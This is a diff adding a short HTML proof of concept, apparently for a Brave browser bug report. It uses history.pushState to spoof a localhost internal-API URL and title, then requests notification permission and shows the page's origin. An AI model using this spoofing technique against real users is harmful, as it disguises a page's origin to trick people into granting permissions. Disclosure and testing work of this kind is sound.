@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Local Service Status</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; }
+        button { font-size: 1.1em; padding: 10px 15px; }
+    </style>
+</head>
+<body>
+    <button onclick="runExploit()">Run</button>
+
+    <script>
+        async function runExploit() {
+            if (location.protocol !== 'https:') return;
+
+            const fakeLocalUrl = 'http://localhost:8080/internal-api/status?session=active';
+            const fakeTitle = 'Local Service Status';
+
+            try {
+                history.pushState({}, fakeTitle, fakeLocalUrl);
+                document.title = fakeTitle;
+            } catch (e) {}
+
+            try {
+                const permission = await Notification.requestPermission();
+                if (permission === 'granted') {
+                    setTimeout(() => {
+                        try {
+                            new Notification('Brave PoC', { body: 'Notificação da origem: ' + location.origin });
+                        } catch(e) {}
+                    }, 1000);
+                }
+            } catch (err) {}
+        }
+    </script>
+</body>
+</html>
